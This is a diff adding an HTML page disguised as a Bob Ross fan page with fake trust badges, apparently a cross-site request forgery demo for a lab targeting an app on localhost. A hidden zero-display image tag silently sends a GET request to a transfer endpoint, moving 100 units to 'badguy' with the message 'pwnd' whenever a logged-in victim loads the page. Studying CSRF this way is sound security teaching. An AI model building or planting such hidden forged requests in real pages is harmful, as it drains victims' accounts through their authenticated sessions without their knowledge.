@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<title>This is a safe site!</title>
+	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">
+
+	<style>
+		.bob {
+			-webkit-transition: 3000s;
+			-o-transition: 3000s;
+			transition: 3000s;
+			margin: 100px;
+		}
+		.spin {
+			-webkit-transform:rotate(360000deg);
+		    -moz-transform:rotate(360000deg); 
+		    -o-transform:rotate(360000deg);
+		}
+		.bob2 {
+			-webkit-transition: 0.3s;
+			-o-transition: 0.3s;
+			transition: 0.3s;
+			position: absolute;
+			z-index: 1001;
+			top: -80px;
+			left: -150px;
+		}
+		.mirror {
+			-moz-transform: scaleX(-1);
+	        -o-transform: scaleX(-1);
+	        -webkit-transform: scaleX(-1);
+	        transform: scaleX(-1);
+	        -moz-transform: scaleX(-1) translate(-490px, 0px);
+	        -o-transform: scaleX(-1) translate(-490px, 0px);
+	        -webkit-transform: scaleX(-1) translate(-490px, 0px);
+	        transform: scaleX(-1) translate(-490px, 0px);
+		}
+
+	</style>
+
+</head>
+<body style="background-color: red; color: green; font-family: serif !important;">
+	
+	<div style="text-align: center; background-color: black; height: 100vh;" class="container">
+		<span style="position:relative; top: 50%;">
+			
+			<h1 style="font-size: 50px;">Bob Ross Fan Page</h1>
+			
+			<img src="images/bobby.jpg" alt="" class="bob" height="200" width="200">
+			<img src="images/bobby2.jpg" alt="" class="bob2" height="200" width="200">
+
+			<h2>You know you can trust this site because of all these stickers</h2>
+			
+
+			<div style="display: inline-box;">
+				<img src="images/verified1.png" alt="" height="100" width="250">
+				<img src="images/verified2.png" alt="" height="100" width="100">
+				<img src="images/verified3.png" alt="" height="100" width="100">
+				<img src="images/verified4.jpg" alt="" height="100" width="100">
+				<img src="images/verified5.png" alt="" height="100" width="200">
+				<img src="images/verified6.png" alt="" height="100" width="100">
+			</div>
+
+			<img src="http://localhost:8080/transfer?receiver=badguy&amount=100&message=pwnd" style="display: none;">
+
+		</span>
+	</div>
+
+	
+	
+</body>
+
+<script src="https://code.jquery.com/jquery-1.11.3.min.js"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
+<script>
+	$(document).ready(function() {
+		$('.bob').addClass('spin');
+	});
+
+	$('.bob2').addClass('fly');
+
+	setInterval(function() {
+		$('.bob2').addClass('mirror');
+	}, 523);
+	setInterval(function() {
+		$('.bob2').removeClass('mirror');
+	}, 1337);
+</script>
+</html>
